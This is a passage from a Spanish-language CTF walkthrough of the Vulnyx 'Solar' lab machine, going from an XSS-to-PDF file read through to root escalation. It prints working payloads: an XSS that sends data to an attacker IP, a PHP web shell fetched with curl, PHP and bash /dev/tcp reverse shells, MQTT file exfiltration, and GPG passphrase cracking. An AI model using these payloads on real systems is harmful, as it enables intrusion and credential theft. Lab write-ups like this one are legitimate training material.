  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:10:55] "GET /?data=JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAA ... dGFydHhyZWYKMTk0MzEKJSVFT0YK HTTP/1.1" 200 -
```

### Paso 4

Guardamos el código base64 del PDF en un fichero y lo transformamos a PDF.

```bash
$ head -c 100 base64pdf3.txt
JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAARABhAHQAYSkKL0NyZWF0b3Ig               
$ cat base64pdf3.txt | base64 -d > document3.pdf
```

Lo abrimos y obtenemos otro código base64, esta vez del fichero PHP cargado localmente por el servidor.

![alt text](../../../assets/images/solar/image-7.png)

### Paso 5

Decodificamos el base64 del PDF y obtenemos el siguiente código PHP del fichero `/var/www/solar.nyx/records/index.php` del servidor.

```php
<?php
include("../session.php");

if (!isset($_SESSION['username']) || empty($_SESSION['username']) || $_SESSION['role'] != 'admin') {
    header("Location: /index.php");
    exit();
}
...

```

En la ejecución de `wkhtmltopdf`, podemos observar que solo podremos leer ficheros del servidor dentro del path `/var/www/`.

```php
...
 $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
 ...
```

## LFI

En este punto, se puede desarrollar un código en Python para facilitar el LFI. Obtenemos diferentes ficheros mediante los pasos descritos anteriormente.

Los ficheros más interesantes que podremos obtener en los servicios web (enumerados al principio con gobuster):

### /var/www/solar.nyx/login.php

Donde podremos obtener las credenciales de la base de datos, accesible solo de forma local y de la que hemos encontrado un backup.

```php
<?php
include("session.php");

$servername = "127.0.0.1";
$username = "solar_user";
$password = "lD5vkvLfMowAiaT7w64C";
$dbname = "solar_energy_db";
....
```

### /var/www/sunfriends.nyx/server.php

Donde podremos obtener otras credenciales muy interesantes `5up3r:bloods`, que nos dan acceso a un panel de administración del servidor `https://www.sunfriends.nyx/server.php` y también podemos utilizarlas para conectarnos al servicio MQTT con este usuario.

```php
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
...
```
![Admin Login](../../../assets/images/solar/image-8.png)

## RCE

Analizando el código fuente de `/var/www/sunfriends.nyx/server.php`, observamos que las credenciales del usuario son utilizadas para la validación del formulario y para la conexión al servicio MQTT.

![Server Administration Panel](../../../assets/images/solar/image-10.png)

Accedemos a `https://www.sunfriends.nyx/server.php` con las credenciales obtenidas `5up3r:bloods`, también nos conectamos al servidor MQTT con las mismas credenciales y nos suscribimos a todos los topics `#`.

![MQTTX Config](../../../assets/images/solar/image-5.png)

Podemos observar que obtenemos todos los mensajes de los topics `data` y `record`, y cuando ejecutamos un comando también del topic `server/command/output`.

![alt text](../../../assets/images/solar/image-11.png)

Intentamos publicar datos en diferentes topics como `server/command/info`, `server/command/add`, `server/command/new`, ... y cuando publicamos en **server/command/new**, recibimos un mensaje que no hemos enviado en el topic `server/command/error`.

![command](../../../assets/images/solar/image-28.png)

Agregamos el parámetro **name** al JSON enviado al topic `server/command/new`.

![command2](../../../assets/images/solar/image-29.png)

También agregamos el parámetro `cmd` y ya no recibimos ningún error. 

En la programación de `/server.php` vemos que el comando es filtrado por la función `escapeshellcmd` de PHP. Según el manual de PHP, esta función...

```text
Los siguientes caracteres son precedidos por una barra invertida: #&;`|*?~<>^()[]{}$\, \x0A y \xFF. ' y " son escapados únicamente si no están emparejados.
```

Preparamos un fichero PHP y levantamos un servicio en el puerto 8000.

```bash
echo '<?php echo(exec($_GET["cmd"])); ?>' > shell.php 
python3 -m http.server 8000
```

y enviamos el siguiente payload en el topic `server/command/new` para subir el fichero `shell.php` (creado anteriormente) en la carpeta `/var/www/solar.nyx/records/`, ya que otras carpetas no nos funcionan y vimos que un script PHP (`/var/www/solar.nyx/records/index.php`) borra ficheros en esta carpeta.

```json
{
  "name": "upload-revshell",
  "cmd": "curl -o /var/www/solar.nyx/records/shell.php http://192.168.1.116:8000/shell.php"
}
```

Ejecutamos el comando `upload-revshell` desde la página `https://www.sunfriends.nyx/server.php` y observamos cómo se descarga el `shell.php` preparado.

```bash
nc -lvnp 12345
```

Enviamos el siguiente `revshell` a través del parámetro `cmd` URL encodeado.

```bash
php -r '$sock=fsockopen("192.168.1.116",12345);exec("/bin/bash <&3 >&3 2>&3");'
```

```
https://www.solar.nyx/records/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C12345%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

Ya tenemos `shell` con `www-data`.

![alt text](../../../assets/images/solar/image-13.png)

## www-data a Lenam

Hacemos el tratamiento de la TTY.

```bash
$ cat /etc/passwd|grep sh  
root:x:0:0:root:/root:/bin/bash
lenam:x:1000:1000:,,,:/home/lenam:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
julian:x:1001:1001::/home/julian:/bin/sh

$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

Podemos ejecutar `mosquitto_pub` como el usuario `lenam` mediante `doas` sin password.

### Obtener `user.txt` e `id_ed25519` de lenam

Encontramos la flag `/home/lenam/user.txt` y también algunas claves SSH. Nos suscribimos al topic `filtrate` en el cliente MQTT y ejecutamos los siguientes comandos.

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/user.txt
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.ssh/id_ed25519
```
![alt text](../../../assets/images/solar/image-14.png)

La clave está encriptada y el `passphrase` es fuerte; no está en `rockyou.txt`.

### Obtener `passphrase` del `id_ed25519` de lenam

Creamos un fichero y una carpeta....

```bash
www-data@solar:/tmp$ ls -l
total 4
-rw-r--r-- 1 www-data www-data    0 Aug 27 17:12 file
drwxr-xr-x 2 www-data www-data 4096 Aug 27 17:11 folder
```

Con el parámetro `-f` de `mosquitto_pub`, podemos identificar si no existe: 

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist
Error: Unable to open file "./filenoexist".
Error loading input file "./filenoexist".
```

Si el fichero existe (incluso enviarlo a un `topic`),

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file       
Error: Both topic and message must be supplied.
mosquitto_pub is a simple mqtt client that will publish a message on a single topic and exit.
mosquitto_pub version 2.0.11 running on libmosquitto 2.0.11.

Usage: mosquitto_pub {[-h host] [--unix path] [-p port] [-u username] [-P password] -t topic | -L URL}
                     {-f file | -l | -n | -m message}
                     [-c] [-k keepalive] [-q qos] [-r] [--repeat N] [--repeat-delay time] [-x session-expiry]
                     [-A bind_address] [--nodelay]
                     [-i id] [-I id_prefix]
                     [-d] [--quiet]
                     [-M max_inflight]
                     [-u username [-P password]]
                     [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
                     [{--cafile file | --capath dir} [--cert file] [--key file]
                       [--ciphers ciphers] [--insecure]
                       [--tls-alpn protocol]
                       [--tls-engine engine] [--keyform keyform] [--tls-engine-kpass-sha1]]
                       [--tls-use-os-certs]
                     [--psk hex-key --psk-identity identity [--ciphers ciphers]]
                     [--proxy socks-url]
                     [--property command identifier value]
                     [-D command identifier value]
       mosquitto_pub --help
      ...
```

O si es una carpeta:

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder
Error: File must be less than 268435455 bytes.

Error loading input file "./folder".

www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist 2>&1 | wc -l
2
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file 2>&1 | wc -l
97
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder 2>&1 | wc -l
3
```

Estamos ante un sistema Debian 12.

```bash
$ cat /etc/debian_version
12.7
```

Creamos un diccionario de los dotfiles más comunes en Debian desde la URL https://wiki.debian.org/DotFilesList.

```bash
www-data@solar:/tmp$ curl https://wiki.debian.org/DotFilesList 2> /dev/null | grep -oP '(?<=\<tt class="backtick">).*?(?=</tt>)' | sort | uniq  > dotfiles.txt
```

y buscamos si existe algún fichero de la lista dentro del home de lenam que podamos obtener.

```bash
www-data@solar:/tmp$ cat ./dotfiles.txt | tr '\n' '\0' | xargs -0 -I {} -P 50 bash -c '
    result=$(doas -u lenam /usr/bin/mosquitto_pub -f "/home/lenam/.local/nano/{}" 2>&1 | wc -l)
    if [ "$result" -eq 3 ]; then
        echo "** Folder {} $(ls -dlah {} 2>/dev/null)"
    elif [ "$result" -eq 97 ]; then
        echo "** File {} $(ls -lah {} 2>/dev/null)"
    fi
'
** File .bash_logout 
** File .bash_history 
** File .bashrc 
** Folder .gnupg/ 
** File .lesshst 
** Folder .local/
** File .nanorc 
** File .ssh/authorized_keys
```

Encontramos las carpetas `.gnupg/` y `.local/` donde podemos volver a pasar el escáner improvisado. También utilizamos otros diccionarios encontrados por internet, modificándolos si es necesario.

- https://github.com/bhavesh-pardhi/Wordlist-Hub/blob/main/WordLists/dotfiles.txt
- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 

Encontramos el passphrase del `id_ed25519` del usuario lenam filtrado en el historial de búsquedas del editor nano en el fichero `/home/lenam/.local/share/nano/search_history`.

Lo enviamos al servidor MQTT:

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.local/share/nano/search_history
```

![Passphrase filtrado](../../../assets/images/solar/image-15.png)

Entramos con la clave SSH del usuario lenam y el passphrase `CzMO48xpwof8nvQ6JUhF` por SSH.

![SSH Lenam](../../../assets/images/solar/image-16.png)

## De lenam a julian

El usuario lenam puede matar procesos como el usuario julian mediante su contraseña, que no tenemos.

```bash
lenam@solar:~$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

Encontramos la carpeta `/home/lenam/.password-store` donde se suelen almacenar las contraseñas de `pass`, un gestor de contraseñas.

![pass test](../../../assets/images/solar/image-17.png)

Podemos ver que el usuario lenam lo utiliza y tiene almacenadas varias contraseñas. No las podemos ver porque nos pide un passphrase para visualizarlas. No sirve el passphrase que tenemos de la clave utilizada en el SSH. Normalmente, este software utiliza una clave GPG para proteger el vault.

Encontramos 2 claves GPG en la carpeta `/home/lenam/.gnupg/private-keys-v1.d/`.

![alt text](../../../assets/images/solar/image-18.png)

### Cracking GPG 2.2

```bash
lenam@solar:~$ gpg --version
gpg (GnuPG) 2.2.40
libgcrypt 1.10.1
Copyright (C) 2022 g10 Code GmbH
License GNU GPL-3.0-or-later <https://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: /home/lenam/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2

lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
``` 

Nos encontramos con una versión GPG 2.2 con GnuPG, donde ha cambiado el nuevo formato de ficheros y no son compatibles con `hashcat`, `john` o `gpg2john`. No podemos o sabemos exportarla a una versión antigua sin tener el passphrase de la clave privada GPG.

```bash
lenam@solar:~$ find .password-store/
.password-store/
.password-store/.gpg-id
.password-store/personal
.password-store/personal/user.gpg
.password-store/personal/private_id.gpg
.password-store/work
.password-store/work/office.gpg
lenam@solar:~$ find .gnupg/
.gnupg/
.gnupg/pubring.kbx
.gnupg/random_seed
.gnupg/gpg-agent.conf
.gnupg/trustdb.gpg
.gnupg/.#lk0x000055afe4c8a3f0.solar.309336
.gnupg/openpgp-revocs.d
.gnupg/openpgp-revocs.d/E6DB2B029F01725397A555CD6CE6C909C038D50C.rev
.gnupg/pubring.kbx~
.gnupg/private-keys-v1.d
.gnupg/private-keys-v1.d/C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key
.gnupg/private-keys-v1.d/18DB29FBB15652340964CF0E1C710F34AA848ADD.key
```

Encontramos dos ficheros de claves privadas y diferentes contraseñas encriptadas por el gestor de contraseñas `pass` y almacenadas en `.password-store`.

```bash
lenam@solar:~$ gpg --list-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
pub   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
sub   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpg --list-secret-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
sec   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
ssb   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpgconf --list-components
gpg:OpenPGP:/usr/bin/gpg
gpgsm:S/MIME:/usr/bin/gpgsm
gpg-agent:Private Keys:/usr/bin/gpg-agent
scdaemon:Smartcards:/usr/lib/gnupg/scdaemon
dirmngr:Network:/usr/bin/dirmngr
pinentry:Passphrase Entry:/usr/bin/pinentry
```

Vemos una clave GPG que pertenece al usuario "secret" con el correo electrónico lenam@solar.nyx. La clave principal se usa para firmar y certificar [SC], mientras que la clave subordinada se usa para cifrar [E] datos. Ambas claves no caducan nunca.
La huella digital (fingerprint) de la clave es `E6DB2B029F01725397A555CD6CE6C909C038D50C`.

La encriptación RSA de 3072 bits es una encriptación muy fuerte y será difícil crackearla por fuerza bruta.

También encontramos un fichero con una nota.

```bash
lenam@solar:~$ cat note.txt 
You just have to remember the one that starts with love and ends with a number.
```

Copiamos las carpetas `.gnupg` en la home del usuario de nuestra máquina (Cuidado aquí si ya tenéis estas carpetas; hacer una copia antes para no perder vuestras claves GPG) y también nos copiamos la carpeta `.password-store`. 

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.password-store .
Enter passphrase for key 'id_ed25519_lenam': 
.gpg-id                                                  100%    7     1.8KB/s   00:00    
user.gpg                                                 100%  471   168.5KB/s   00:00    
private_id.gpg                                           100%  471    93.7KB/s   00:00    
office.gpg                                               100%  463   108.3KB/s   00:00    
                                                                                           
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.gnupg ~/         
Enter passphrase for key 'id_ed25519_lenam': 
tofu.db                                                  100%   48KB   6.9MB/s   00:00    
pubring.kbx                                              100% 1954   562.6KB/s   00:00    
random_seed                                              100%  600   154.7KB/s   00:00    
gpg-agent.conf                                           100%   36     9.3KB/s   00:00    
trustdb.gpg                                              100% 1280   442.1KB/s   00:00    
.#lk0x

000055afe4c8a3f0.solar.309336                      100%   17     5.5KB/s   00:00    
E6DB2B029F01725397A555CD6CE6C909C038D50C.rev             100% 1626   528.3KB/s   00:00    
pubring.kbx~                                             100% 1960   713.3KB/s   00:00    
C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key             100% 3105     1.9MB/s   00:00    
18DB29FBB15652340964CF0E1C710F34AA848ADD.key             100% 3105     1.7MB/s   00:00
```

Utilizando rockyou y filtrando las contraseñas que empiezan por "love" y terminan por un número, intentamos obtener el passphrase utilizado para encriptar la clave GPG con el siguiente script bash.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ time grep -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt | xargs -P 4 -I {} sh -c 'echo "Testing passphrase: {} ..."; gpg --batch --yes --passphrase "{}" --pinentry-mode loopback --decrypt .password-store/work/office.gpg 2>/dev/null && echo "** Passphrase found: {}" && killall xargs'
Testing passphrase: love123 ...
Testing passphrase: love12 ...
Testing passphrase: loveme1 ...
Testing passphrase: lovely1 ...
Testing passphrase: lover1 ...
...
Testing passphrase: love27 ...
Testing passphrase: lovers2 ...
Testing passphrase: loverboy1 ...
Testing passphrase: love55 ...
Testing passphrase: love77 ...
Testing passphrase: love45 ...
d1NpIh1bCKMx
** Passphrase found: loverboy1
zsh: broken pipe  grep --color=auto -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt | 
zsh: terminated   xargs -P 4 -I {} sh -c 

real    21,11s
user    0,05s
sys     0,00s
cpu     0%

real    21,11s
user    0,16s
sys     0,02s
cpu     0%
```

En unos 21 segundos obtenemos el passphrase de la clave GPG `loverboy1` y los datos encriptados de `.password-store/work/office.gpg` `d1NpIh1bCKMx`, aunque esta contraseña no nos servirá. Podemos ahora visualizar el resto de contraseñas en el gestor `pass`.

### Node

Ahora que ya tenemos el passphrase (`loverboy1`) del gestor, podemos obtener todas las contraseñas.

```bash
lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
lenam@solar:~$ pass personal/private_id
CzMO48xpwof8nvQ6JUhF
lenam@solar:~$ pass personal/user
qiFQI7buDp7zIQnAymEY
lenam@solar:~$ pass work/office
d1NpIh1bCKMx
```

La contraseña `personal/private_id` es la passphrase de la clave SSH que ya tenemos; `personal/user` es la contraseña del usuario `lenam`, necesaria para la ejecución de `doas`. La última contraseña `work/office` no la necesitaremos.

Ahora que tenemos la contraseña de `lenam`, podemos matar procesos como el usuario `julian` mediante `doas`.

```text
permit lenam as julian cmd /bin/kill
```

Buscamos procesos que tenga abiertos el usuario `julian`.

```bash
lenam@solar:~$ ps aux | grep julian
julian    549542  3.2  3.9 1053996 79168 ?       Ssl  05:11   0:00 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
julian    549553  5.0  8.8 34100228 179060 ?     Ssl  05:11   0:00 /home/julian/.cache/puppeteer/chrome/linux-126.0.6478.126/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold,IsolateSandboxedIframes --enable-features=PdfOopif --headless=new --hide-scrollbars --mute-audio about:blank --ignore-certificate-errors --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_chrome_profile-W1SxUQ
...
```

Encontramos un proceso que ejecuta `nodejs`. Este proceso se reinicia cada 2 minutos, cambiando su PID.  

Podemos intentar matar el proceso enviando una señal `SIGUSR1`; esto reiniciará el proceso de `nodejs` con el puerto del inspector abierto por defecto en el puerto `9229`.

Verificamos si podemos ejecutar el binario de `nodejs` que está en el servidor y si tenemos permisos de ejecución.

```bash
lenam@solar:~$ /home/julian/.nvm/versions/node/v22.7.0/bin/node --version
v22.7.0
```

Matamos el proceso y, a continuación, intentamos entrar con el inspector de `nodejs`.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password: 
connecting to localhost:9229 ... ok
debug> 
```

Podemos entrar al inspector y enviar comandos al proceso de la aplicación mediante `exec()`. Esto funcionará un rato hasta que el proceso sea reiniciado (aproximadamente cada 2 minutos); después, tendremos que salir del inspector con `.exit`.

Nos ponemos a escuchar con `netcat` en nuestra máquina.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ nc -lvnp 5000 
listening on [any] 5000 ...
```

En el servidor, ejecutamos el comando anterior para entrar en el inspector de `nodejs`.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password: 
connecting to localhost:9229 ... ok
debug> 
```

Rápidamente, sin esperar mucho tiempo, introducimos en el depurador:

```javascript
debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.116/5000 0>&1\"')")
```

Obtenemos una `revshell` con el usuario `julian`.

![revshell julian](../../../assets/images/solar/image-19.png)

## De julian a root

Hacemos el tratamiento de la TTY.

```bash
julian@solar:/$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

El usuario `julian` puede ejecutar el binario `/usr/local/bin/backups` como `root`, conservando la variable de entorno `PATH`, pero necesitamos la contraseña del usuario.

### Contraseña de julian

Encontramos una imagen JPG en la carpeta del usuario. La traemos a nuestra máquina mediante `curl` y el módulo de Python `uploadserver`. 

![uploadserver](../../../assets/images/solar/image-20.png)

Con `stegcracker` y `rockyou.txt`, en unos pocos segundos averiguamos la contraseña `teresa` y extraemos la información.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ stegcracker my-pass.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2024 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'my-pass.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: teresa
Tried 851 passwords
Your file has been written to: my-pass.jpg.out
teresa
                                                                                                  
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ cat my-pass.jpg.out
Password programmed

D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg

```

Aparece la frase `Password programmed` y después:

```text
D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg
```

Si buscamos entre lenguajes de programación difíciles de entender, encontramos `Malbolge`, un lenguaje de programación complicado, desarrollado así a propósito por su creador.

Hay diferentes sitios web donde podemos ejecutar `Malbolge` online; nosotros utilizamos:

https://malbolge.doleczek.pl/

Copiamos el texto del programa `Malbolge` encontrado en la imagen y lo ejecutamos.

![julian password](../../../assets/images/solar/image-21.png)

Encontramos la contraseña del usuario `julian`: `tk8QaHUi3XaMLYoP1BpZ`.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password: 
Usage: /usr/local/bin/backups <database_name>
julian@solar:~$ 
```

### Binario backups

Analizamos el binario `/usr/local/bin/backups` que ahora podemos ejecutar como el usuario `root`.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password: 
Usage: /usr/local/bin/backups <database_name>

julian@solar:~$ doas /usr/local/bin/backups test
doas (julian@solar) password: 
mysqldump: Got error: 1049: "Unknown database 'test'" when selecting the database
Error executing mysqldump and gzip. Exit code: 512

julian@solar:~$ doas /usr/local/bin/backups --help
doas (julian@solar) password: 
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.

julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password: 
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

```

Parece ser un binario encargado de hacer el backup que hemos encontrado al inicio de este writeup. No parece ser vulnerable a buffer overflow. Miramos si tiene librerías que podamos suplantar con `ldd`.

```bash
julian@solar:~$ ldd /usr/local/bin/backups
        linux-vdso.so.1 (0x00007ffe26ffc000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1665b82000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1665d71000)
```

```bash
julian@solar:~$ readelf -d /usr/local/bin/backups

Dynamic section at offset 0x2de0 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x14f0
 0x0000000000000019 (INIT_ARRAY)         0x3dd0
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dd8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x560
 0x0000000000000006 (SYMTAB)             0x3c8
 0x000000000000000a (STRSZ)              244 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fe8
 0x0000000000000002 (PLTRELSZ)           240 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x7a0
 0x0000000000000007 (RELA)               0x6c8
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x678
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x654
 0x000000006ffffff9 (RELACOUNT)          3
 0x0000000000000000 (NULL)               0x0
```

Con `strings`, intentamos entender un poco más.

```bash
julian@solar:~$ strings /usr/local/bin/backups
/lib64/ld-linux-x86-64.so.2
dlclose
strlen
__ctype_b_loc
__libc_start_main
stderr
fprintf
dlsym
dlopen
__cxa_finalize
dlerror
__isoc99_sscanf
fwrite
libc.so.6
GLIBC_2.3
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
%2hhx
Usage: %s <database_name>
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.
/var/www/sunfriends.nyx/database.sql.gz
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
Backup completed successfully: %s

...
```

Podemos observar `dlclose`, `dlopen`, ... que son utilizados para la carga de librerías dinámicas. También encontramos dos textos sospechosos de cargar librerías de forma dinámica, precedidos de unos códigos en hexadecimal.

```text
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
```

Nos dirigimos a [CyberChef](https://gchq.github.io/CyberChef/) y utilizamos la `Recipe` `Magic`, activando `Intensive mode` y `Extensive language support`. Pegamos el primer código `05000b0b080a021c19471a06`.

Después de un rato calculando, CyberChef hace magia y descubre que está codificado en hexadecimal y después en XOR con la clave `69`.

![CyberChef 1](../../../assets/images/solar/image-22.png)

Nos descubre el nombre de una librería `libbackup.so`. Hacemos lo mismo con el otro código más largo `0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19`, que está codificado de la misma forma con la misma clave XOR.

![CyberChef 2](../../../assets/images/solar/image-23.png)

Ya tenemos el nombre de una librería `libbackup.so` y lo que parece ser el nombre de una función `create_compressed_backup`.

Podríamos traer el fichero a nuestra máquina y utilizar `uftrace`, pero no lo vemos necesario. 

```bash
